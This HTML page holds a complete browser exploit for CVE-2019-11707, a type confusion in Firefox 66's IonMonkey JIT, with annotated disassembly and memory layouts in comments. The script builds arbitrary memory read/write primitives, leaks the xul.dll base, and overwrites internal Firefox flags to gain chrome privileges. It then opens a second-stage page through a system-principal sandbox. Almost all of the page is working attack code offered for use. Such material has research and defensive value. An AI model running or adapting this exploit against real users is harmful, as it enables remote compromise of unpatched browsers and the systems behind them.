<html>
<body>
<script>

/*
  _______ ___ ___ _______        _______ _______ _____ _______        _____ _____ _______ _______ _______ 
 |   _   |   Y   |   _   |______|       |   _   | _   |   _   |______| _   | _   |   _   |   _   |   _   |
 |.  1___|.  |   |.  1___|______|___|   |.  |   |.|   |   |   |______|.|   |.|   |___|   |.  |   |___|   |
 |.  |___|.  |   |.  __)_        /  ___/|.  |   `-|.  |\___   |      `-|.  `-|.  |  /   /|.  |   |  /   / 
 |:  1   |:  1   |:  1   |      |:  1  \|:  1   | |:  |:  1   |        |:  | |:  | |   | |:  1   | |   |  
 |::.. . |\:.. ./|::.. . |      |::.. . |::.. . | |::.|::.. . |        |::.| |::.| |   | |::.. . | |   |  
 `-------' `---' `-------'      `-------`-------' `---`-------'        `---' `---' `---' `-------' `---'  
                                                                                                        
Exploit Title: Firefox 64-bit JIT Type Confusion
Date: 2021-12-07
Exploit Author: deadlock (Forrest Orr)
Author Homepage: https://forrest-orr.net
Vendor Homepage: https://www.mozilla.org/en-US/
Version: Firefox 66 64-bit
Tested on: Windows 7 x64, Windows 8.1 x64, Windows 10 x64
CVE: CVE-2019-11707
Bypasses: DEP, High Entropy ASLR, CFG

-----------------------------------------------------------------------------------------------

Overview
                                 
This is a Windows variation of CVE-2019-11707, an exploit targetting a type
confusion bug in the Array.pop method during inlining/IonMonkey JIT compilation
of affected code in versions of Firefox up to 66.

Fundamentally this allows for the creation oof specifally crafted malicious 
arrays, whose elements must all conform to a common/benign shape so that their
parent array type set will be immutable. 

So we have an array consisting of benign objects, all of the same type. We loop
through a JIT'd function that does an Array.pop on this malicious array and then
attempts to access this popped element.
*/

////////
////////
// Global helpers/settings
////////

var JITIterations = 0x10000; // Number of iterations needed to trigger JIT compilation of code. The compilation count threshold varies and this is typically overkill (10+ or 1000+ is often sufficient) but is the most stable count I've tested.
var HelperBuf = new ArrayBuffer(8);
var HelperDbl = new Float64Array(HelperBuf);
var HelperDword = new Uint32Array(HelperBuf);
var HelperWord = new Uint16Array(HelperBuf);

var OverflowArrays = []
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20)); // <- Overflow from here
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));

var BugArrayBuf = OverflowArrays[5];
var CorruptedArrayBuf = OverflowArrays[6];
var MutableArray = OverflowArrays[7];
var BugArrayUint32 = new Uint32Array(BugArrayBuf);
var WannabeSparseArray = [BugArrayUint32, BugArrayUint32];

////////
////////
// Debug/timer code
////////

var EnableDebug = false;
var EnableTimers = false;
var AlertOutput = true;
var TimeStart;
var ReadCount;

function StartTimer() {
    ReadCount = 0;
    TimeStart = new Date().getTime();
}

function EndTimer(Message) {
    var TotalTime = (new Date().getTime() - TimeStart);
    
    if(EnableTimers) {
        if(AlertOutput) {
            alert("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
        else {
            console.log("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
    }
}

function DebugLog(Message) {
    if(EnableDebug) {
        if(AlertOutput) {
            alert(Message);
        }
        else {
            console.log(Message); // In IE, console only works if devtools is open.
        }
    }
}

/*//////
////////
// JIT bug logic/initialization
////////

What follows is the machine code generated by IonMonkey for the bugged JS function.

0000014FA8BC7CA0 | 48:83EC 20               | sub rsp,20                              |
0000014FA8BC7CA4 | 48:8B4424 40             | mov rax,qword ptr ss:[rsp+40]           |
0000014FA8BC7CA9 | 48:C1E8 2F               | shr rax,2F                              |
0000014FA8BC7CAD | 3D F3FF0100              | cmp eax,1FFF3                           |
0000014FA8BC7CB2 | 0F85 E3020000            | jne 14FA8BC7F9B                         |
0000014FA8BC7CB8 | 48:8B4424 48             | mov rax,qword ptr ss:[rsp+48]           |
0000014FA8BC7CBD | 48:C1E8 2F               | shr rax,2F                              |
0000014FA8BC7CC1 | 3D F1FF0100              | cmp eax,1FFF1                           |
0000014FA8BC7CC6 | 0F85 CF020000            | jne 14FA8BC7F9B                         |
0000014FA8BC7CCC | E9 04000000              | jmp 14FA8BC7CD5                         |
0000014FA8BC7CD1 | 48:83EC 20               | sub rsp,20                              |
0000014FA8BC7CD5 | 49:BB 785F225A7F000000   | mov r11,7F5A225F78                      |
0000014FA8BC7CDF | 49:3923                  | cmp qword ptr ds:[r11],rsp              |
0000014FA8BC7CE2 | 0F83 BA020000            | jae 14FA8BC7FA2                         |
0000014FA8BC7CE8 | 8B4424 48                | mov eax,dword ptr ss:[rsp+48]           |
0000014FA8BC7CEC | 894424 1C                | mov dword ptr ss:[rsp+1C],eax           |
0000014FA8BC7CF0 | 48:B9 00C1B25C7F000000   | mov rcx,7F5CB2C100                      |
0000014FA8BC7CFA | 48:8B49 10               | mov rcx,qword ptr ds:[rcx+10]           |
0000014FA8BC7CFE | 48:BA 000000000000FEFF   | mov rdx,FFFE000000000000                |
0000014FA8BC7D08 | 48:3391 00070000         | xor rdx,qword ptr ds:[rcx+700]          |
0000014FA8BC7D0F | 48:B9 B0BCC65C7F000000   | mov rcx,7F5CC6BCB0                      |
0000014FA8BC7D19 | FF21                     | jmp qword ptr ds:[rcx]                  |
0000014FA8BC7D1B | 4C:8BD9                  | mov r11,rcx                             |
0000014FA8BC7D1E | 49:C1EB 2F               | shr r11,2F                              |
0000014FA8BC7D22 | 41:81FB F1FF0100         | cmp r11d,1FFF1                          |
0000014FA8BC7D29 | 0F85 D3020000            | jne 14FA8BC8002                         |
0000014FA8BC7D2F | 8BD1                     | mov edx,ecx                             |
0000014FA8BC7D31 | 85D2                     | test edx,edx                            |
0000014FA8BC7D33 | 0F85 67000000            | jne 14FA8BC7DA0                         |
0000014FA8BC7D39 | E9 6B000000              | jmp 14FA8BC7DA9                         |
0000014FA8BC7D3E | 48:83EC 20               | sub rsp,20                              |
0000014FA8BC7D42 | 48:B9 000000000080F9FF   | mov rcx,FFF9800000000000                |
0000014FA8BC7D4C | 41:F741 FC 01000000      | test dword ptr ds:[r9-4],1              |
0000014FA8BC7D54 | 0F84 04000000            | je 14FA8BC7D5E                          |
0000014FA8BC7D5A | 49:8B49 D8               | mov rcx,qword ptr ds:[r9-28]            |
0000014FA8BC7D5E | 49:8B51 C8               | mov rdx,qword ptr ds:[r9-38]            |
0000014FA8BC7D62 | 49:8B59 C0               | mov rbx,qword ptr ds:[r9-40]            |
0000014FA8BC7D66 | 48:8B4424 48             | mov rax,qword ptr ss:[rsp+48]           |
0000014FA8BC7D6B | 4C:8BD8                  | mov r11,rax                             |
0000014FA8BC7D6E | 49:C1EB 2F               | shr r11,2F                              |
0000014FA8BC7D72 | 41:81FB F1FF0100         | cmp r11d,1FFF1                          |
0000014FA8BC7D79 | 0F85 8A020000            | jne 14FA8BC8009                         |
0000014FA8BC7D7F | 8BC0                     | mov eax,eax                             |
0000014FA8BC7D81 | 894424 1C                | mov dword ptr ss:[rsp+1C],eax           |
0000014FA8BC7D85 | 4C:8BDA                  | mov r11,rdx                             |
0000014FA8BC7D88 | 49:C1EB 2F               | shr r11,2F                              |
0000014FA8BC7D8C | 41:81FB F1FF0100         | cmp r11d,1FFF1                          |
0000014FA8BC7D93 | 0F85 77020000            | jne 14FA8BC8010                         |
0000014FA8BC7D99 | 8BC2                     | mov eax,edx                             |
0000014FA8BC7D9B | E9 B4010000              | jmp 14FA8BC7F54                         |
0000014FA8BC7DA0 | 894424 1C                | mov dword ptr ss:[rsp+1C],eax           |
0000014FA8BC7DA4 | E9 69000000              | jmp 14FA8BC7E12                         |
0000014FA8BC7DA9 | 894424 1C                | mov dword ptr ss:[rsp+1C],eax           |
0000014FA8BC7DAD | 48:B8 00C1B25C7F000000   | mov rax,7F5CB2C100                      |
0000014FA8BC7DB7 | 48:8B50 10               | mov rdx,qword ptr ds:[rax+10]           |
0000014FA8BC7DBB | 48:B9 000000000000FEFF   | mov rcx,FFFE000000000000                |
0000014FA8BC7DC5 | 48:338A 00070000         | xor rcx,qword ptr ds:[rdx+700]          |
0000014FA8BC7DCC | 48:B8 000000000000FEFF   | mov rax,FFFE000000000000                |
0000014FA8BC7DD6 | 48:3382 30070000         | xor rax,qword ptr ds:[rdx+730]          | rdx+730:"°Q‘Z"
0000014FA8BC7DDD | 48:8B11                  | mov rdx,qword ptr ds:[rcx]              |
0000014FA8BC7DE0 | 48:8B12                  | mov rdx,qword ptr ds:[rdx]              |
0000014FA8BC7DE3 | F742 08 00000400         | test dword ptr ds:[rdx+8],40000         |
0000014FA8BC7DEA | 0F85 11000000            | jne 14FA8BC7E01                         |
0000014FA8BC7DF0 | 48:8B51 18               | mov rdx,qword ptr ds:[rcx+18]           |
0000014FA8BC7DF4 | F742 F0 04000000         | test dword ptr ds:[rdx-10],4            |
0000014FA8BC7DFB | 0F85 16020000            | jne 14FA8BC8017                         |
0000014FA8BC7E01 | BA 01000000              | mov edx,1                               |
0000014FA8BC7E06 | 48:BB 18BDC65C7F000000   | mov rbx,7F5CC6BD18                      |
0000014FA8BC7E10 | FF23                     | jmp qword ptr ds:[rbx]                  |
0000014FA8BC7E12 | 48:B8 00C1B25C7F000000   | mov rax,7F5CB2C100                      |
0000014FA8BC7E1C | 48:8B48 10               | mov rcx,qword ptr ds:[rax+10]           |
0000014FA8BC7E20 | 48:B8 000000000000FEFF   | mov rax,FFFE000000000000                |
0000014FA8BC7E2A | 48:3381 00070000         | xor rax,qword ptr ds:[rcx+700]          |
0000014FA8BC7E31 | 48:B9 A0BDC65C7F000000   | mov rcx,7F5CC6BDA0                      |
0000014FA8BC7E3B | FF21                     | jmp qword ptr ds:[rcx]                  |
0000014FA8BC7E3D | 4C:8BD9                  | mov r11,rcx                             |
0000014FA8BC7E40 | 49:C1EB 2F               | shr r11,2F                              |
0000014FA8BC7E44 | 41:81FB FCFF0100         | cmp r11d,1FFFC                          |
0000014FA8BC7E4B | 0F85 87020000            | jne 14FA8BC80D8                         |
0000014FA8BC7E51 | 48:BA 000000000000FEFF   | mov rdx,FFFE000000000000                |
0000014FA8BC7E5B | 48:33D1                  | xor rdx,rcx                             |
0000014FA8BC7E5E | 33DB                     | xor ebx,ebx                             |
0000014FA8BC7E60 | 49:BB 8081B85C7F000000   | mov r11,7F5CB88180                      |
0000014FA8BC7E6A | 49:3BD3                  | cmp rdx,r11                             |
0000014FA8BC7E6D | 0F85 6C020000            | jne 14FA8BC80DF                         |
0000014FA8BC7E73 | 48:0F45D3                | cmovne rdx,rbx                          |
0000014FA8BC7E77 | 49:BB 000000000000FEFF   | mov r11,FFFE000000000000                |
0000014FA8BC7E81 | 4C:0BD8                  | or r11,rax                              |
0000014FA8BC7E84 | 4C:891C24                | mov qword ptr ss:[rsp],r11              |
0000014FA8BC7E88 | 49:BB 8081B85C7F00FEFF   | mov r11,FFFE007F5CB88180                |
0000014FA8BC7E92 | 41:53                    | push r11                                |
0000014FA8BC7E94 | 48:B9 0058225A7F000000   | mov rcx,7F5A225800                      |
0000014FA8BC7E9E | 33D2                     | xor edx,edx                             |
0000014FA8BC7EA0 | 4C:8BC4                  | mov r8,rsp                              |
0000014FA8BC7EA3 | 52                       | push rdx                                |
0000014FA8BC7EA4 | 68 20300000              | push 3020                               |
0000014FA8BC7EA9 | 49:B9 B57EBCA84F010000   | mov r9,14FA8BC7EB5                      |
0000014FA8BC7EB3 | 41:51                    | push r9                                 |
0000014FA8BC7EB5 | 4C:8B89 10010000         | mov r9,qword ptr ds:[rcx+110]           |
0000014FA8BC7EBC | 49:8961 70               | mov qword ptr ds:[r9+70],rsp            |
0000014FA8BC7EC0 | 6A 00                    | push 0                                  |
0000014FA8BC7EC2 | 4C:8BCC                  | mov r9,rsp                              |
0000014FA8BC7EC5 | 48:83E4 F0               | and rsp,FFFFFFFFFFFFFFF0                |
0000014FA8BC7EC9 | 41:51                    | push r9                                 |
0000014FA8BC7ECB | 48:83EC 28               | sub rsp,28                              |
0000014FA8BC7ECF | E8 4C020000              | call 14FA8BC8120                        |
0000014FA8BC7ED4 | 48:83C4 28               | add rsp,28                              |
0000014FA8BC7ED8 | 5C                       | pop rsp                                 |
0000014FA8BC7ED9 | A8 FF                    | test al,FF                              |
0000014FA8BC7EDB | 0F84 2F020000            | je 14FA8BC8110                          |
0000014FA8BC7EE1 | 48:8B4C24 20             | mov rcx,qword ptr ss:[rsp+20]           |
0000014FA8BC7EE6 | 0FAEE8                   | lfence                                  |
0000014FA8BC7EE9 | 48:83C4 28               | add rsp,28                              |
0000014FA8BC7EED | 4C:8BD9                  | mov r11,rcx                             |
0000014FA8BC7EF0 | 49:C1EB 2F               | shr r11,2F                              |
0000014FA8BC7EF4 | 41:81FB FCFF0100         | cmp r11d,1FFFC                          |
0000014FA8BC7EFB | 0F85 E5010000            | jne 14FA8BC80E6                         |
0000014FA8BC7F01 | 48:B8 000000000000FEFF   | mov rax,FFFE000000000000                |
0000014FA8BC7F0B | 48:33C1                  | xor rax,rcx                             |
0000014FA8BC7F0E | 33D2                     | xor edx,edx                             |
0000014FA8BC7F10 | 49:BB F02DB75C7F000000   | mov r11,7F5CB72DF0                      |
0000014FA8BC7F1A | 4C:3918                  | cmp qword ptr ds:[rax],r11              |
0000014FA8BC7F1D | 0F85 CA010000            | jne 14FA8BC80ED                         |
0000014FA8BC7F23 | 48:0F45C2                | cmovne rax,rdx                          |
0000014FA8BC7F27 | 8B48 28                  | mov ecx,dword ptr ds:[rax+28]           |
0000014FA8BC7F2A | 48:8B40 38               | mov rax,qword ptr ds:[rax+38]           |
0000014FA8BC7F2E | 8B5424 1C                | mov edx,dword ptr ss:[rsp+1C]           |
0000014FA8BC7F32 | 45:33DB                  | xor r11d,r11d                           |
0000014FA8BC7F35 | 3BD1                     | cmp edx,ecx                             |
0000014FA8BC7F37 | 0F83 0B000000            | jae 14FA8BC7F48                         |
0000014FA8BC7F3D | 41:0F43D3                | cmovae edx,r11d                         |
0000014FA8BC7F41 | C70490 80000000          | mov dword ptr ds:[rax+rdx*4],80         | <- Type confusion: IonMonkey JIT'd an index access for Uint32Array with a DWORD operand. By confusing the type with Uint8Array we can pass the boundscheck and corrupt 32-bits out of bounds with the SIB of this instruction
0000014FA8BC7F48 | 48:B9 000000000080F9FF   | mov rcx,FFF9800000000000                |
0000014FA8BC7F52 | 33C0                     | xor eax,eax                             |
0000014FA8BC7F54 | 8B5424 1C                | mov edx,dword ptr ss:[rsp+1C]           |
0000014FA8BC7F58 | 49:BB 545F225A7F000000   | mov r11,7F5A225F54                      |
0000014FA8BC7F62 | 41:833B 00               | cmp dword ptr ds:[r11],0                |
0000014FA8BC7F66 | 0F85 88010000            | jne 14FA8BC80F4                         |
0000014FA8BC7F6C | 3D 00000100              | cmp eax,10000                           |
0000014FA8BC7F71 | 0F8D 05000000            | jge 14FA8BC7F7C                         |
0000014FA8BC7F77 | 83C0 01                  | add eax,1                               |
0000014FA8BC7F7A | EB DC                    | jmp 14FA8BC7F58                         |
0000014FA8BC7F7C | 48:83C4 20               | add rsp,20                              |
0000014FA8BC7F80 | C3                       | ret                                     |                                                                                 
*/

function BuggedJITFunc(Index) {
    if (WannabeSparseArray.length == 0) {
        WannabeSparseArray[1] = BugArrayUint32; // Convert target array to a sparse array, being careful to preserve the type set: if it were to change, IonMonkey will de-optimize this function back to bytecode
    }

    const Uint32Obj = WannabeSparseArray.pop();
    Uint32Obj[Index] = 0x80; // This will be an OOB index access which will fail its boundscheck prior to being confused with a Uint8Array
    for (var i = 0; i < JITIterations; i++) {} // JIT compile this function
}

var CustomPrototype = [new Uint8Array(BugArrayBuf)]; // When IonMonkey JITs the bug function it will not check the type set of this custom prototype, only its ArrayPrototype. Only one element is needed since the sparse array access will be at index 0
WannabeSparseArray.__proto__ = CustomPrototype;

// In theory only 3 should be needed (original was 2000) but it never works with 3, always works with 4.
for (var i = 0; i < 4; i++) { // The function JITs itself, this iteration count is what is required to empty out the array, make it sparse, and then make the type confusion access
    BuggedJITFunc(18); // 18*4 = 0x48: CorruptedArray.NativeObject.SlotsPtr
	
/*
ArrayBuffer in memory:
	
                  +-> group                +->shape
                  |                        |
0x7f8e13a88280:  0x00007f8e13a798e0  0x00007f8e13aa1768

                  +-> slots                +->elements (Empty in this case)
                  |                        |
0x7f8e13a88290:  0x0000000000000000  0x000055d6ee8ead80

                  +-> Shifted pointer
                  |   pointing to          +-> size in bytes of the data buffer
                  |   data buffer          |
0x7f8e13a882a0:  0x00003fc709d44160  0xfff8800000000020

                  +-> Pointer
                  |   pointing to          +-> flags
                  |   first view           |
0x7f8e13a882b0:  0xfffe7f8e15e00480  0xfff8800000000000
	*/
}

// Initialize mutable array properties for R/W/AddressOf primitives. Use these specific values so that it can later be verified whether slots pointer modifications have been successful.

MutableArray.x = 5.40900888e-315; // Most significant bits are 0 - no tag, allows an offset of 4 to be treated as a double
MutableArray.y = 0x41414141;
MutableArray.z = 0; // Least significant bits are 0 - offset of 4 means that y will be treated as a double

var CorruptedClone = new Uint8Array(OverflowArrays[6]);

function LeakSlotsPtr() {
    var SavedSlotsPtrBytes = CorruptedClone.slice(0x30, 0x38);
    var LeakedSlotsPtrDbl = new Float64Array(SavedSlotsPtrBytes.buffer);
    return LeakedSlotsPtrDbl;
}

function SetSlotsPtr(NewSlotsPtrDbl) {
    HelperDbl[0] = NewSlotsPtrDbl;
    
    for(var i = 0; i < 8; i++) {
        var Temp = new Uint8Array(HelperBuf);
        CorruptedClone[0x30 + i] = Temp[i];
    }
}

/*//////
////////
// Exploit primitives
///////*/

function WeakLeakDbl(TargetAddress) {
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    SetSlotsPtr(TargetAddress);
    var LeakedDbl = MutableArray.x;
    SetSlotsPtr(SavedSlotsPtrDbl);
    return LeakedDbl;
}

function WeakWriteDbl(TargetAddress, Val) { 
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    SetSlotsPtr(TargetAddress);
    MutableArray.x = Val;
    SetSlotsPtr(SavedSlotsPtrDbl);
}

function WeakLeakObjectAddress(Obj) {
    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????????????] | [Target object address] | [0x????????????????]
    MutableArray.y = Obj;

    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????Target o] | [bject adress????????] | [0x????????????????]
    
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    HelperDbl[0] = SavedSlotsPtrDbl;
    HelperDword[0] = HelperDword[0] + 4;
    SetSlotsPtr(HelperDbl[0]);
    
    // Patch together a double of the target object address from the two 32-bit property values
    
    HelperDbl[0] = MutableArray.x;
    var LeakedLow = HelperDword[1];
    HelperDbl[0] = MutableArray.y; // Works in release, not in debug (assertion issues)
    var LeakedHigh = HelperDword[0] & 0x00007fff; // Filter off tagged pointer bits
    SetSlotsPtr(SavedSlotsPtrDbl);
    HelperDword[0] = LeakedLow;
    HelperDword[1] = LeakedHigh;
    
    return HelperDbl[0];
}

var ExplicitDwordArray = new Uint32Array(10);
var ExplicitDwordArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read
var ExplicitDblArray = new Float64Array(1);
var ExplicitDblArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read
var ExplicitWordArray = new Uint16Array(10);
var ExplicitWordArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read

function InitStrongRWPrimitive() {
	// Leak data view pointers from the typed arrays
	
    HelperDbl[0] = WeakLeakObjectAddress(ExplicitDblArray);
    HelperDword[0] = HelperDword[0] + 0x38; // Float64Array data view pointer (same as ArrayBuffer)
    ExplicitDblArrayDataPtr = HelperDbl[0];
	
    HelperDbl[0] = WeakLeakObjectAddress(ExplicitDwordArray);
    HelperDword[0] = HelperDword[0] + 0x38; // Uint32Array data view pointer (same as ArrayBuffer)
    ExplicitDwordArrayDataPtr = HelperDbl[0];
	
	HelperDbl[0] = WeakLeakObjectAddress(ExplicitWordArray);
    HelperDword[0] = HelperDword[0] + 0x38; // Uint16Array data view pointer (same as ArrayBuffer)
    ExplicitWordArrayDataPtr = HelperDbl[0];
	HelperDbl[0] = WeakLeakDbl(HelperDbl[0]); // In the event initialization failed, the first read will return the initial marker data in the x y and z slots of the MutableArray
	
	if(HelperDword[0] == 0x41414141) {
        alert("Arbitrary read primitive failed");
        window.location.reload();
        return 0.0;
    }
}

function ExplicitLeakDbl(TargetAddress) {
    WeakWriteDbl(ExplicitDblArrayDataPtr, TargetAddress);
    return ExplicitDblArray[0];
}

function StrongWriteDword(TargetAddress, Value) {
    WeakWriteDbl(ExplicitDwordArrayDataPtr, TargetAddress);
    ExplicitDwordArray[0] = Value;
}

function StrongLeakWord(TargetAddress){
    WeakWriteDbl(ExplicitWordArrayDataPtr, TargetAddress);
    return ExplicitWordArray[0];
}

function StrongLeakDword(TargetAddress){
    WeakWriteDbl(ExplicitDwordArrayDataPtr, TargetAddress);
    return ExplicitDwordArray[0];
}

function GetJSFuncJITInfoPtr(JSFuncObj) {
    HelperDbl[0] = WeakLeakObjectAddress(JSFuncObj); // The JSFunction object address associated with the (now JIT compiled) shellcode data.
    HelperDword[0] = HelperDword[0] + 0x30; // JSFunction.u.native.extra.jitInfo_ contains a pointer to the +RX JIT region at offset 0 of its struct.
    var JITInfoAddress = WeakLeakDbl(HelperDbl[0]);
    return JITInfoAddress;
}

function GetJSFuncJITCodePtr(JSFuncObj) {
    var JITInfoAddress = GetJSFuncJITInfoPtr(JSFuncObj);
    
    if(JITInfoAddress) {
        var JITCodePtr = WeakLeakDbl(JITInfoAddress); // Leak the address to the compiled JIT assembly code associated with the JIT'd shellcode function from its JitInfo struct (it is a pointer at offset 0 of this struct)
        return JITCodePtr;
    }
    
    return 0.0;
}

function LeakXulBase() {
	/*
	Float64Array NativeObject
	
	struct NativeObject {
		void *GroupPtr;
		void *ShapePtr;
		void *SlotsPtr;
		void *ElementsPtr; // This does NOT point to the element metadata, it points OVER it to the actual element data itself.
	}

	0000029E4C834290  0000029E4EDA9AC1  Á.ÚN....  <- Group pointer
	0000029E4C834298  0000029E4C831200  ...L....  
	0000029E4C8342A0  0000000000000000  ........  
	0000029E4C8342A8  00007FFAFB9B1BB0  °..ûú...  <- Element pointer (xul.dll base: 00007FFAF73F0000)
	
	0:000> dt js::NativeObject 0x016c8d201cc0
	   +0x000 group_           : js::GCPtr<js::ObjectGroup *>
	   +0x008 shapeOrExpando_  : 0x0000016c`8daac970 Void
	   +0x010 slots_           : (null) 
	   +0x018 elements_        : 0x00007ff7`f7ecdac0 js::HeapSlot

	0:000> dt js!js::GCPtr<js::ObjectGroup *> 0x16c8d201cc0
	   +0x000 value            : 0x0000016c`8da7ad30 js::Ob

	0:000> dt js!js::ObjectGroup 0x0000016c`8da7ad30
	   +0x000 clasp_           : 0x00007ff7`f7edc510 js::Class
	   +0x008 proto_           : js::GCPtr<js::TaggedProto>
	   +0x010 realm_           : 0x0000016c`8d92a800 JS::Realm
	   +0x018 flags_           : 1
	   +0x020 addendum_        : (null) 
	   +0x028 propertySet      : (null) 

	0:000> dt js!js::Class 0x00007ff7`f7edc510 
	   +0x000 name             : 0x00007ff7`f7f8e0e8  "Uint8Array"
	   +0x008 flags            : 0x65200303
	   +0x010 cOps             : 0x00007ff7`f7edc690 js::ClassOps
	   +0x018 spec             : 0x00007ff7`f7edc730 js::ClassSpec
	   +0x020 ext              : 0x00007ff7`f7edc930 js::ClassExtension
	   +0x028 oOps             : (null) 
	*/
	
	const Target = new Uint8Array(1);
	const NativeObjAddress = WeakLeakObjectAddress(Target);
	const ObjectGroup = WeakLeakDbl(NativeObjAddress);
	const Clasp = WeakLeakDbl(ObjectGroup);
	const ClassName = WeakLeakDbl(Clasp);
	var LeakedXulAddress = HelperDbl[0] = ClassName;

	HelperDword[0] = HelperDword[0] - 0x4D49785;
	LeakedXulAddress = HelperDbl[0];
	DebugLog("Leaked xul.dll base from delta: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
	
	return LeakedXulAddress;
}

function CVE_2019_11707_Stage1() {
    if(window.netscape.security.PrivilegeManager == undefined) {
		InitStrongRWPrimitive();
		var LeakedXulAddress = LeakXulBase();
		HelperDbl[0] = LeakedXulAddress;
		DebugLog("Leaked xul.dll base address: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
		HelperDword[0] = HelperDword[0] - 0x1000;
		LeakedXulAddress = HelperDbl[0];
		HelperDword[0] = HelperDword[0] + 0x05034e1b;
		var sAutomationPrefIsSet  = HelperDbl[0]; 
		DebugLog("sAutomationPrefIsSet xul.dll address: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
		StrongWriteDword(sAutomationPrefIsSet, 0x1);

		HelperDbl[0] = LeakedXulAddress;
		HelperDword[0] = HelperDword[0] + 0x05034E1c;
		var sPrefCacheAdded  = HelperDbl[0]; 
		DebugLog("sPrefCacheAdded xul.dll address: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
		StrongWriteDword(sPrefCacheAdded, 0x1);
		
		HelperDbl[0] = LeakedXulAddress;
		HelperDword[0] = HelperDword[0] + 0x04fe4dc3;
		var disabledForTest  = HelperDbl[0]; 
		DebugLog("disabledForTest xul.dll address: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
		StrongWriteDword(disabledForTest, 0x1);
    }
	else {
		window.netscape.security.PrivilegeManager.enablePrivilege(); // The sAutomationPrefIsSet, sPrefCacheAdded  and disabledForTest booleans from xpcpublic.h affect the viability of this action through the internal xul.dll functions AreNonLocalConnectionsDisabled and IsInAutomation. Once all are patched to true, this action will succeed.
		const { Services } = Components.utils.import('resource://gre/modules/Services.jsm');
		const Sbx = Cu.Sandbox(Services.scriptSecurityManager.getSystemPrincipal());
		const Code = _GetDocShellFromWindow.toSource();
		Components.utils.evalInSandbox(Code, Sbx);
		const DocShell = Sbx._GetDocShellFromWindow(window);
		Components.utils.nukeSandbox(Sbx);
		var Uri = location.origin + "/Stage2_Forrest_Orr_CVE-2019-11707_64-bit.html";
		//alert(Uri);
		DocShell.messageManager.sendSyncMessage('Prompt:Open', { uri: Uri });
		//DocShell.messageManager.sendSyncMessage('Prompt:Open', { uri: "file:///C:/Users/PrimaryUser/Documents/GitHub/Exploits/CVE-2019-11707/Stage2_Forrest_Orr_CVE-2019-11707_64-bit.html" });
    }
}

function _GetDocShellFromWindow(Win) {
    return Win.docShell;
}

CVE_2019_11707_Stage1();

</script>
</body>
</html>
